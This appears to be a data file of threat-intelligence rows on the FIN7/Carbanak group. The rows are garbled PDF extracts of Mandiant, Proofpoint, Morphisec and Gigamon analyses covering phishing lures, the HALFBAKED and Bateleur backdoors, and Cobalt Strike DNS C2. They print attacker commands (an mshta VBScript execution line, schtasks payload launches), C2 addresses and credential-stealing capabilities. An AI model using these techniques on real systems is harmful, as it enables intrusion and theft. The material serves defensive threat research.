(f5f8ab9863dc12d04731b1932fc3609742de68252c706952f31894fc21746bb8). Company Products Resources The document again uses the social engineering technique of spooﬁng a known and trusted entity to convince the victim to enable macros. Based on the submission date and creation time, the document is sent to the target within 2-3 days. https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign Pagina 8 di 11 FIN7 Not Finished – Morphisec Spots New Campaign 06/09/24, 10:23 The macro is nearly identical to that described above except that wscript->script, errors->settings, has multiple captions instead of a single one. The JavaScript backdoor is decrypted into a similar backdoor: Conclusion Like the Hydra, cutting off one, or even three, heads of FIN7 barely slows it down. With the holiday rush nearly upon us, we expect the threat group to step up its activities to take advantage of increased https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign Pagina 9 di 11 FIN7 Not Finished – Morphisec Spots New Campaign 06/09/24, 10:23 email trafﬁc ﬂow and seasonal staff that may be less security conscious. Workers in any industry should stay vigilant against social engineering methods – although with today’s highly targeted campaigns this can sometimes be tough to spot. And never enable macros unless you are 100 percent certain that the ﬁle is safe. Products Product Overview Solutions By Industry Solutions by Use Case Morphisec for Windows Endpoints Banking & Finance Hedge Funds Morphisec for Windows Servers & Workloads Healthcare Technology Manufacturing Legal Microsoft Defender for Endpoint Microsoft Defender AV Virtual Desktop Protection Ransomware Protection Morphisec for Linux Server Protection Morphisec Vulnerability Visibility & Prioritization Incident Response Services About Moving Target Defense K-12 Education Supply Chain Attack Protection SMB Cloud Workload Protection Remote Employee Security Virtual Patching & Compliance Browser Attack Protection Company About Us News & Events Careers Blog Support Partners Contact Us Privacy & Legal Contact Sales Inquire via Azure https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign Pagina 10 di 11"
fin7,cti-hal,680cd17b7592,G0046,"FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 Threat Intelligence FIN7 Evolution and the Phishing LNK April 24, 2017 Mandiant Wri!en by: Nick Carr, Saravanan Mohankumar, Yogesh Londhe, Barry Vengerik, Dominik Weber FIN7 is a ""nancially-motivated threat group that has been associated with malicious operations dating back to late 2015. FIN7 is referred to by many vendors as “Carbanak Group”, although we do not equate all usage of the CARBANAK backdoor with FIN7. FireEye recently observed a FIN7 spear phishing campaign targeting personnel involved with United States Securities and Exchange https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 1 di 13 FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 Commission (SEC) ""lings at various organizations. In a newly-identi""ed campaign, FIN7 modi""ed their phishing techniques to implement unique infection and persistence mechanisms. FIN7 has moved away from weaponized Microso# O$ce macros in order to evade detection. This round of FIN7 phishing lures implements hidden sho%cut ""les (LNK ""les) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim. In this ongoing campaign, FIN7 is targeting organizations with spear phishing emails containing either a malicious DOCX or RTF ""le – two versions of the same LNK ""le and VBScript technique. These lures originate from external email addresses that the a!acker rarely re-used, and they were sent to various locations of large restaurant chains, hospitality, and ""nancial service organizations. The subjects and a!achments were themed as complaints, catering orders, or resumes. As with previous campaigns, and as highlighted in our annual M-Trends 2017 repo%, FIN7 is calling stores at targeted organizations to ensure they received the email and a!empting to walk them through the infection process. https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 2 di 13 FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 Infection Chain While FIN7 has embedded VBE as OLE objects for over a year, they continue to update their script launching mechanisms. In the current lures, both the malicious DOCX and RTF a!empt to convince the user to double-click on the image in the document, as seen in Figure 1. This spawns the hidden embedded malicious LNK ""le in the document. Overall, this is a more e&ective phishing tactic since the malicious content is embedded in the document content rather than packaged in the OLE object. By requiring this unique interaction – double- clicking on the image and clicking the “Open” bu!on in the security warning popup – the phishing lure a!empts to evade dynamic detection as many sandboxes are not con""gured to simulate that speci""c user action. https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 3 di 13 FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 Figure 1: Malicious FIN7 lure asking victim to double click to unlock contents The malicious LNK launches “mshta.exe” with the following arguments passed to it: vbscript:Execute(""On Error Resume Next:set w=GetObject(,""""Word.Application""""):execute w.ActiveDocument.Shapes(2).TextFrame.Text Range.Text:close"") The script in the argument combines all the textbox contents in the document and executes them, as seen in Figure 2. https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 4 di 13 FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 Figure 2: Textbox inside DOC The combined script from Word textbox drops the following components: \Users\ [user_name]\Intel\58d2a83f7778d5.36783181.v bs \Users\ [user_name]\Intel\58d2a83f777942.26535794. ps1 \Users\ [user_name]\Intel\58d2a83f777908.23270411.v bs Also, the script creates a named schedule task for persistence to launch “58d2a83f7778d5.36783181.vbs” every 25 minutes. VBScript #1 The dropped script “58d2a83f7778d5.36783181.vbs” acts as a https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 5 di 13 FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 launcher. This VBScript checks if the “58d2a83f777942.26535794.ps1” PowerShell script is running using WMI queries and, if not, launches it. PowerShell Script “58d2a83f777942.26535794.ps1” is a multilayer obfuscated PowerShell script, which launches shellcode for a Cobalt Strike stager. The shellcode retrieves an additional payload by connecting to the following C2 server using DNS: aaa.stage.14919005.www1.proslr3[.]com Once a successful reply is received from the command and control (C2) server, the PowerShell script executes the embedded Cobalt Strike shellcode. If unable to contact the C2 server initially, the shellcode is con""gured to rea!empt communication with the C2 server address in the following pa!ern: [a-z][a-z][a- z].stage.14919005.www1.proslr3[.]com VBScript #2 https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 6 di 13 FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 “mshta.exe” fu%her executes the second VBScript “58d2a83f777908.23270411.vbs”, which creates a folder by GUID name inside “Intel” and drops the VBScript payloads and con""guration ""les: \Intel\{BFF4219E-C7D1-2880-AE58- 9C9CD9701C90}\58d2a83f777638.60220156.i ni \Intel\{BFF4219E-C7D1-2880-AE58- 9C9CD9701C90}\58d2a83f777688.78384945. ps1 \Intel\{BFF4219E-C7D1-2880-AE58- 9C9CD9701C90}\58d2a83f7776b5.64953395.t xt \Intel\{BFF4219E-C7D1-2880-AE58- 9C9CD9701C90}\58d2a83f7776e0.72726761.v bs \Intel\{BFF4219E-C7D1-2880-AE58- 9C9CD9701C90}\58d2a83f777716.48248237.v bs \Intel\{BFF4219E-C7D1-2880-AE58- 9C9CD9701C90}\58d2a83f777788.86541308.v bs \Intel\{BFF4219E-C7D1-2880-AE58- 9C9CD9701C90}\Foxconn.lnk This script then executes “58d2a83f777716.48248237.vbs”, which is a variant of FIN7’s HALFBAKED backdoor. HALFBAKED Backdoor https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 7 di 13 FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 Variant The HALFBAKED malware family consists of multiple components designed to establish and maintain a foothold in victim networks, with the ultimate goal of gaining access to sensitive ""nancial information. This version of HALFBAKED connects to the following C2 server: hxxp://198[.]100.119.6:80/cd hxxp://198[.]100.119.6:443/cd hxxp://198[.]100.119.6:8080/cd This version of HALFBAKED listens for the following commands from the C2 server: info: Sends victim machine information (OS, Processor, BIOS and running processes) using WMI queries processList: Send list of process running screenshot: Takes screen shot of victim machine (using 58d2a83f777688.78384945.ps1) runvbs: Executes a VB script runexe: Executes EXE ""le runps1: Executes PowerShell script delete: Delete the speci""ed ""le update: Update the speci""ed ""le All communication between the backdoor and https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 8 di 13 FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 a!acker C2 are encoded using the following technique, represented in pseudo code: Function send_data(data) random_string = custom_function_to_generate_random_string () Cloud encoded_data = Contact sales Get started for free URLEncode(SimpleEncrypt(data)) Blog post_data(""POST”, random_string & ""="" & Solutions & technology Ecosystem Developers & Practitioners encoded_data, Hard_coded_c2_url, Create_Random_Url(class_id)) The FireEye iSIGHT Intelligence MySIGHT Po%al contains additional information based on our investigations of a variety of topics discussed in this post, including FIN7 and the HALFBAKED backdoor. Persistence Mechanism Figure 3 shows that for persistence, the document creates two scheduled tasks and creates one auto-sta% registry entry pointing to the LNK ""le. https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 9 di 13 FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 Figure 3: FIN7 phishing lure persistence mechanisms Examining A!acker Shortcut Files In many cases, a!acker-created LNK ""les can reveal valuable information about the a!acker’s development environment. These ""les can be parsed with lnk-parser to extract all contents. LNK ""les have been valuable during Mandiant incident response investigations as they include volume serial number, NetBIOS name, and MAC address. For example, one of these FIN7 LNK ""les contained the following prope%ies: Version: 0 NetBIOS name: andy-pc Droid volume identi""er: e2c10c40-6f7d- 4442-bcec-470c96730bca Droid ""le identi""er: a6eea972-0e2f-11e7- 8b2d-0800273d5268 https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 10 di 13 FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 Bi%h droid volume identi""er: e2c10c40- 6f7d-4442-bcec-470c96730bca Bi%h droid ""le identi""er: a6eea972-0e2f- 11e7-8b2d-0800273d5268 MAC address: 08:00:27:3d:52:68 UUID timestamp: 03/21/2017 (12:12:28.500) [UTC] UUID sequence number: 2861 From this LNK ""le, we can see not only what the sho%cut launched within the string data, but that the a!acker likely generated this ""le on a Vi%ualBox system with hostname “andy- pc” on March 21, 2017. Example Phishing Lures Filename: Doc33.docx MD5: 6a5a42ed234910121dbb7d1994ab5a5e Filename: Mail.%f MD5: 1a9e113b2f3caa7a141a94c8bc187ea7 FIN7 April 2017 Community Protection Event On April 12, in response to FIN7 actively https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 11 di 13 FIN7 Evolution and the Phishing LNK | Mandiant | Google Cloud Blog 10/09/24, 12:40 targeting multiple clients, FireEye kicked o& a Community Protection Event (CPE) – a coordinated e&o% by FireEye as a Service (FaaS), Mandiant, FireEye iSight Intelligence, and our product team – to secure all clients a&ected by this campaign. Posted in Threat Intelligence—Security & Identity Related articles Threat Threat Threat Threat Intelligence Intelligence Intelligence Intelligence DeFied Expectations — Examining Web3 Heists By Mandiant • 18-minute read I Spy With My Li!le Eye: Uncovering an Iranian Counterintelligence Operation By Mandiant • 13-minute read PEAKLIGHT: Decoding the Stealthy Memory- Only Malware By Mandiant • 22-minute read A Measure of Motive: How A!ackers Weaponize Digital Analytics Tools By Mandiant • 23-minute read https://cloud.google.com/blog/topics/threat-intelligence/fin7-phishing-lnk/ Pagina 12 di 13"
fin7,cti-hal,827c86270c98,G0046,
fin7,cti-hal,0b21b9406dda,G0046,"FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor | Proofpoint US 07/09/24, 18:39 Blog / Threat Insight / FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor SHARE WITH YOUR NETWORK! JULY 31, 2017 | MATTHEW MESA, DARIEN HUSS Overview Proofpoint researchers have uncovered that the threat actor commonly referred to as FIN7 has added a new JScript backdoor called Bateleur and updated macros to its toolkit. We have observed these new tools being used to target U.S.-based chain restaurants, although FIN7 has previously targeted hospitality organizations, retailers, merchant services, suppliers and others. The new macros and Bateleur backdoor use sophisticated anti-analysis and sandbox evasion techniques as they attempt to cloak their activities and expand their victim pool. SpeciVcally, the Vrst FIN7 change we observed was in the obfuscation technique found in their usual document attachments delivering the GGLDR script [1], initially described by researchers at FireEye [2]. In addition, starting in early June, we observed this threat actor using macro documents to drop a previously undocumented JScript backdoor, which we have named “Bateleur”, instead of dropping their customary GGLDR payload. Since its initial sighting, there have been multiple updates to Bateleur and the attachment macros. In this blog we take a deep dive into Bateleur and the email messages and documents delivering it. Delivery The example message (Fig. 1) uses a very simple lure to target a restaurant chain. It purports to be https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor Pagina 1 di 12 FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor | Proofpoint US 07/09/24, 18:39 information on a previously discussed check. The email is sent from an Outlook.com account, and the attachment document lure also matches that information by claiming “This document is encrypted by Outlook Protect Service”. In other cases, when the message was sent from a Gmail account, the lure document instead claims “This document is encrypted by Google Documents Protect Service” (Fig. 2). Figure 1: Phishing email containing JScript document dropper https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor Pagina 2 di 12 FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor | Proofpoint US 07/09/24, 18:39 Figure 2: Malicious “Outlook” document lure (left) and “Google” lure (right) Analysis The email contains a macro-laden Word document. The macro accesses the malicious payload via a caption: UserForm1.Label1.Caption (Fig. 3). The caption contains a “|*|”-delimited obfuscated JScript payload (Fig. 4). The macro Vrst extracts the JScript from the caption then saves the content to debug.txt in the current user’s temporary folder (%TMP%). Next, the macro executes the following commands, which are stored in an obfuscated manner by reversing the character order: 1. schtasks /create /f /tn """"GoogleUpdateTaskMachineCorefh5evfbce5bhfd37"""" /tr """"wscript.exe //b /e:jscript %TMP%\debug.txt """" /sc ONCE /st """"05:00"""" /sd """"12/12/1990"""" 2. Sleep for 3 seconds 3. schtasks /Run /I /TN """"GoogleUpdateTaskMachineCorefh5evfbce5bhfd37"""" 4. Sleep for 10 seconds 5. schtasks /Delete /F /TN """"GoogleUpdateTaskMachineCorefh5evfbce5bhfd37"""" In the Vrst step, the macro creates a scheduled task whose purpose is to execute debug.txt as a JScript. The https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor Pagina 3 di 12 FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor | Proofpoint US 07/09/24, 18:39 macro then sleeps for 3 seconds, after which it runs the scheduled task. Finally, the macro sleeps for 10 seconds then deletes the malicious scheduled task. The combined effect of these commands is to run Bateleur on the infected system in a roundabout manner in an attempt to evade detection. Figure 3: Macro from c91642c0a5a8781fff9fd400bff85b6715c96d8e17e2d2390c1771c683c7ead9 Figure 4: Caption containing malicious obfuscated JScript The malicious JScript has robust capabilities that include anti-sandbox functionality, anti-analysis (obfuscation), retrieval of infected system information, listing of running processes, execution of custom commands and PowerShell scripts, loading of EXEs and DLLs, taking screenshots, uninstalling and updating itself, and possibly the ability to exVltrate passwords, although the latter requires an additional module from the command and control server (C&C). When Bateleur Vrst executes it creates a scheduled task “GoogleUpdateTaskMachineSystem” for persistence using the following command pattern: schtasks /Create /f /tn ""GoogleUpdateTaskMachineSystem"" /tr ""wscript.exe //b /e:jscript C:\Users\[user account]\AppData\Local\Temp\{[hex]-[hex]-[hex]-[hex]-[hex]}\debug.txt"" /sc minute /mo 5 https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor Pagina 4 di 12 FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor | Proofpoint US 07/09/24, 18:39 Bateleur has anti-sandbox features but they do not appear to be used at this time. This includes detection of Virtualbox, VMware, or Parallels via SMBIOSBIOSVersion and any of the following strings in DeviceID: vmware PCI\\VEN_80EE&DEV_CAFE VMWVMCIHOSTDEV The backdoor also contains a process name blacklist including: autoit3.exe dumpcap.exe tshark.exe prl_cc.exe Bateleur also checks its own script name and compares it to a blacklist which could indicate that the script is being analyzed by an analyst or a sandbox: malware sample mlwr Desktop The following Table describes the commands available in the backdoor. Command Description get_information Return various information about the infected machine, such as computer and domain name, OS, screen size, and net view get_process_list Return running process list (name + id) kill_process Kill process using taskkill uninstall Delete installation Vle and path and remove scheduled task https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor Pagina 5 di 12 FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor | Proofpoint US 07/09/24, 18:39 GoogleUpdateTaskMachineSystem update Overwrite JScript Vle with response content exe Perform a “load_exe” request to the C&C to retrieve an EXE, save it as debug.backup in the install_path, write a cmd.exe command to a Vle named debug.cmd and then execute debug.cmd with cmd.exe wexe dll Perform a “load_exe” request to C&C to retrieve an EXE, save it as debug.log and then execute the EXE via WMI Perform a “load_dll” request to the C&C to retrieve a DLL, save it as debug.backup in the install_path, write a regsvr32 command to a Vle named debug.cmd and then execute debug.cmd with cmd.exe cmd Perform a “load_cmd” request to the C&C to retrieve a command to execute, create temp Vle named log_[date].cmd containing command to execute, execute the command and sleep for 55 seconds. Send Vle output to the C&C via a POST request and remove the temporary command Vle powershell Perform a “load_powershell” request to the C&C to retrieve a command to execute, create a temp Vle named log_[date].log containing a PowerShell command to execute, execute the command, and sleep for 55 seconds. Send Vle output to the C&C via a POST request and remove the temporary command Vle apowershell Same as powershell command but instead executes a PowerShell command directly with powershell.exe wpowershell Same as powershell command but instead executes a PowerShell command via WMI get_screen Take a screenshot and save it as screenshot.png in the install_path get_passwords Perform a “load_pass” request to the C&C to retrieve a PowerShell command containing a payload capable of retrieving user account credentials timeout Do nothing Table 1: List of commands available in the Bateleur backdoor The Bateleur C&C protocol occurs over HTTPS and is fairly straightforward with no additional encoding or obfuscation. Bateleur uses HTTP POST requests with a URI of “/?page=wait” while the backdoor is waiting for instructions. Once an instruction is received from the controller (Fig. 5), the backdoor will perform a new request related to the received command (Fig. 6). https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor Pagina 6 di 12 FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor | Proofpoint US 07/09/24, 18:39 Figure 5: Bateleur HTTP POST “wait” request Figure 6: Bateleur HTTP POST receiving command from C&C After each command the backdoor will respond with typically either an OK for many commands, or send the results back to the C&C with a Vnal POST request. Although Bateleur has a much smaller footprint than GGLDR/HALFBAKED, lacks basic features such as encoding in the C&C protocol, and does not have backup C&C servers, we expect the Bateleur developer(s) may add those features in the near future. In less than one month, we have observed Bataleur jump from version 1.0 to 1.0.4.1; the newer version of the backdoor adds several new commands including the wexe, apowershell, and wpowershell (Table 1) that did not exist in version 1.0. Attribution Proofpoint researchers have determined with a high degree of certainty that this backdoor is being used by the same group that is referred to as FIN7 by FireEye [3] and as Carbanak by TrustWave [4] and others. In this section we will discuss each datapoint that connects this backdoor with previous FIN7 activity. Email Message/Campaign Similarity In June we observed similar messages separately delivering GGLDR and Bateleur to the same target, with some even sharing very similar or identical attachment names, subject lines, and/or sender addresses. The timing and similarity between these campaigns suggest that they were sent by the same actor. Tinymet https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor Pagina 7 di 12 FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor | Proofpoint US 07/09/24, 18:39 A small Meterpreter downloader script, called Tinymet by the actor(s) (possibly inspired by [5]), has repeatedly been observed being utilized by this group at least as far back as 2016 [6] as a Stage 2 payload. In at least one instance, we observed Bateleur downloading the same Tinymet Meterpreter downloader (Fig. 7). Figure 7: Beginning snippet from Tinymet downloaded by Bateleur Moreover, the GGLDR/HALFBAKED backdoor was recently equipped with a new command tinymet (Fig. 8) which was used in at least one occasion (Fig. 9) to download a JScript version of the Tinymet Meterpreter downloader (Fig. 10). Figure 8: GGLDR is updated with a Tinymet command FIgure 9: GGLDR receiving Tinymet command from C&C (after decoding base64 with custom alphabet) https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor Pagina 8 di 12 FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor | Proofpoint US 07/09/24, 18:39 Figure 10: Snippet from Tinymet downloaded by GGLDR tinymet command We have also observed Tinymet delivered via the runps1 (Fig. 11) and runvbs (Fig. 12) commands, resulting in the same version of Tinymet downloaded by Bateleur (Fig. 13). All observed instances of Tinymet have utilized the same XOR key of 0x50. Figure 11: GGLDR receiving Tinymet via runps1 command Figure 12: GGLDR receiving Tinymet via runvbs command https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor Pagina 9 di 12 FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor | Proofpoint US 07/09/24, 18:39 Figure 13: Snippet from decoded Tinymet downloaded by GGLDR runps1 and runvbs commands Password Grabber During our analysis we observed that the Powershell password grabber utilized by Bateleur contained an identical DLL (stealer_component_reu.dll - 8c00afd815355a00c55036e5d18482f730d5e71a9f83fe23c7a1c0d9007ced5a) as the one we found embedded in a powershell contained in recent GGLDR samples. This further demonstrates the payload re-use between instances using the two different backdoors. Conclusion We continue to see regular changes to the tactics and tools used by FIN7 in their attempt to infect more targets and evade detection. The Bateleur JScript backdoor and new macro-laden documents appear to be the latest in the group’s expanding toolset, providing new means of infection, additional ways of hiding their activity, and growing capabilities for stealing information and executing commands directly on victim SEARCH ENGLISH (AMERICAS) machines. LOGIN References PRODUCTS Proofpoint SOLUTIONS RESOURCES CONTACT [1] https://blogs.forcepoint.com/security-labs/carbanak-group-uses-google-malware-command-and-control [2] https://www.Vreeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html [3] https://www.Vreeye.com/blog/threat-research/2017/04/Vn7-phishing-lnk.html https://www.trustwave.com/Resources/SpiderLabs-Blog/Carbanak-Continues-To-Evolve--Quietly-Creeping- [4] into-Remote-Hosts/ [5] https://github.com/SherifEldeeb/TinyMet [6] https://www.trustwave.com/Resources/SpiderLabs-Blog/New-Carbanak-/-Anunak-Attack-Methodology/ https://www.trustwave.com/Resources/SpiderLabs-Blog/Operation-Grand-Mars--a-comprehensive-proVle- [7] of-Carbanak-activity-in-2016/17/ Indicators of Compromise (IOCs) Bateleur Document Droppers cf86c7a92451dca1ebb76ebd3e469f3fa0d9b376487ee6d07ae57ab1b65a86f8 c91642c0a5a8781fff9fd400bff85b6715c96d8e17e2d2390c1771c683c7ead9 FIN7 Password Stealer Module 8c00afd815355a00c55036e5d18482f730d5e71a9f83fe23c7a1c0d9007ced5a https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor Pagina 10 di 12 FIN7/Carbanak threat actor unleashes Bateleur JScript backdoor | Proofpoint US 07/09/24, 18:39 Bateleur C&C 195.133.48[.]65:443 195.133.49[.]73:443 185.154.53[.]65:443 188.120.241[.]27:443 176.53.25[.]12:443 5.200.53[.]61:443 Tinymet C&C 185.25.48[.]186:53 46.166.168[.]213:443 188.165.44[.]190:53 ET and ETPRO Suricata/Snort Coverage 2825129,ETPRO TROJAN Carbanak VBS/GGLDR v2 Checkin 2825130,ETPRO TROJAN Carbanak VBS/GGLDR v2 CnC Beacon 2826201,ETPRO TROJAN Carbanak VBS/GGLDR v2 CnC Beacon 2 2826592,ETPRO TROJAN Carbanak VBS/GGLDR v3 CnC Beacon 2826631,ETPRO TROJAN Carbanak/FIN7 Bateleur SSL CertiVcate Detected 2826167,ETPRO TROJAN Carbanak/FIN7 Tinymet Downloader Receiving Payload 2826674,ETPRO TROJAN Carbanak/FIN7 Bateleur CnC Beacon Previous Blog Post Next Blog Post https://www.proofpoint.com/us/threat-insight/post/fin7carbanak-threat-actor-unleashes-bateleur-jscript-backdoor Pagina 11 di 12"
fin7,cti-hal,e1fc48c49e8b,G0046,"Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 SECURITY (HTTPS://BLOG.GIGAMON.COM/CATEGORY/SECURITY/) / JULY 26, 2017 Footprints of Fin7: Tracking Actor Patterns (Part 1) ATR (https://blog.gigamon.com/author/atrteam/) Justin Warner (https://blog.gigamon.com/author/justin- warner/) Stephen Hinck (https://blog.gigamon.com/author/stephen- hinck/) The following blog post and research was originally published by ICEBRG prior to being acquired (https://www.gigamon.com/company/news-and- events/newsroom/ICEBRG.html) by Gigamon on July 24th, 2018. The 2017 Verizon DBIR Report (http://www.verizonenterprise.com/verizon-insights- lab/dbir/2017/) states that 73 percent of breaches in 2016 were https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 2 di 15 Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 financially motivated and span a number of different industries (https://www.fireeye.com/blog/threat- research/2017/03/fin7_spear_phishing.html)and financial (https://www.fireeye.com/blog/threat-research/2017/04/fin7- phishing-lnk.html) targets. Since 2015, a financially motivated threat group known as FIN7 (also referred to as the Carbanak Group) has emerged from the shadows and has been highlighted in a number of different incidents (https://www.trustwave.com/Resources/SpiderLabs- Blog/Operation-Grand-Mars--a-comprehensive-profile-of- Carbanak-activity-in-2016/17/). This group is a moderately sophisticated and persistent adversary that has targeted various industries. In early 2017, Gigamon Applied Threat Research (ATR) detected and observed FIN7 activity and spent some time profiling various aspects of their operations. This analysis showed that, as many others have reported, FIN7 is not just a capable threat group that utilizes “off the shelf” capabilities to accomplish their objectives, but also adapts to meet the challenges of the environment in which they are operating. It is our hope that this information will help others dealing with the threat actors and also shine light on some recommended capabilities for response teams to better understand the mindset of their adversaries. This is part one of a two-part blog series detailing the team’s engagements with FIN7 throughout early 2017. Part one of this series focuses on the network command and control techniques used by the actors. In these posts, Gigamon ATR will not disclose https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 3 di 15 Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 IOCs from the campaigns, but rather focus on specific patterns that may help identify attacker activity. (Part two (/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-2/)) FIN7 Network Command and Control (C2) FIN7 Network While it is widely believed that the use of custom tools is a characteristic of sophisticated threat actor groups, open source and commercially available tools are easily obtained, easy to hide, and, due to their widespread legitimate use, make attribution difficult. FIN7 makes heavy use of these tools, involving a number of techniques throughout their operations. Operational Patterns Gigamon ATR observed FIN7 using several types of communications to maintain a foothold in their target environment, rotating their infrastructure throughout the operation in order to stay one step ahead of response and remediation efforts. For their primary command and control (C2), FIN7 used Cobalt Strike’s DNS C2 as their method of maintaining access inside target environments. Two separate C2 servers wereused during the observed periods: one used heavily during initial access and a second one used more during post- exploitation activities. The authoritative DNS servers for the malicious domains were geographically distributed, but all hosted within the same low- reputation Virtual Private Server (VPS) provider. The secondary C2 method leveraged a different encrypted communication https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 4 di 15 Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 channel. Infrastructure for the secondary C2 method was also hosted on the same geographically disparate low-reputation VPS provider. During the incident, Gigamon ATR observed that the attackers were consistently active between 08:00 and 23:00 GMT, with peak activity at 17:00 GMT and with minimal activity outside of that window. This time window is not intended to perform any sort of attribution but was useful when planning and coordinating phases of the response effort. (https://blog.gigamon.com/wp- content/uploads/2020/06/7.10_Figure-1-Actor-DNS- C2-activity-by-hour.png) Figure 1: Actor DNS C2 activity broken out by hour. Using these timelines, Gigamon ATR was able to identify FIN7 employing different C2 techniques based on their operational patterns. Before concluding operations for the day, the adversary would set their callback times to one hour, and change the mode of their communications to use A resource records (instead of TXT records). This change appeared to be an attempt by the actors to maintain a lower profile by using more natural queries in the environment. Further, the threat actors would spawn a secondary C2 component during their off-hour periods in an apparent attempt to maintain access should the DNS C2 be detected. We will explore each of these techniques further in the following sections. https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 5 di 15 Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 Cobalt Strike DNS C2 DNS C2 leverages malicious DNS TXT and A RRs (resource records) queries which traverse standard recursive DNS channels and terminate at an attacker’s authoritative DNS server. The traversal of standard DNS channels make this technique effective for highly controlled environments where restrictive firewall, web filter or proxy policies are enforced; for example, in point of sale (POS) networks in the retail and hospitality sector, as well as other high-security financial transaction environments. (https://blog.gigamon.com/wp- content/uploads/2020/06/7.10_Figure-2-Example-of- DNS-C2-Trafﬁc.png) Figure 2: Example ﬂow of DNS C2 trafﬁc. The specific C2 capabilities of Cobalt Strike are outlined in various blogs (https://www.cobaltstrike.com/) on their website. It should be noted that Cobalt Strike allows for modification of several aspects of the DNS C2 channel through the Malleable C2 (https://www.cobaltstrike.com/help-malleable-c2) option. In the observed operations, FIN7 used the default communication settings present in Cobalt Strike without modification. This https://blog.gigamon.com/2017/07/26/footprints-of-fin7-tracking-actor-patterns-part-1/ Pagina 6 di 15 Footprints of Fin7: Tracking Actor Patterns (Part 1) - Gigamon Blog 09/09/24, 17:47 decision (or lack thereof) could be indicative of lack of tool knowledge, or a lack of necessity to do anything more to accomplish their objectives. The communications schema and components leveraged in the attack are broken out below. During the initial exploitation, and throughout the lateral spread attack phases, the actors used PowerShell scripts to deploy DNS TXT record stagers into memory. During execution, PowerShell would make iterative DNS TXT queries, which would return encrypted data to be concatenated and then executed in memory. These queries followed a pattern matching: aaa.stage.[encryptedstage].MaliciousDomain.com, baa.stage.[encryptedstage].MaliciousDomain.com, caa.stage.[encryptedstage].MaliciousDomain.com Emerging Threats Pro (https://www.proofpoint.com/us/threat- insight/et-pro-ruleset) has a signature for this part of the Cobalt Strike DNS C2 chain (SID 2809850) that should provide basic alerting. By monitoring for the aaa.stage. [encryptedstage].MaliciousDomain.com pattern, Gigamon ATR was able to detect attacker movement in real time, prior 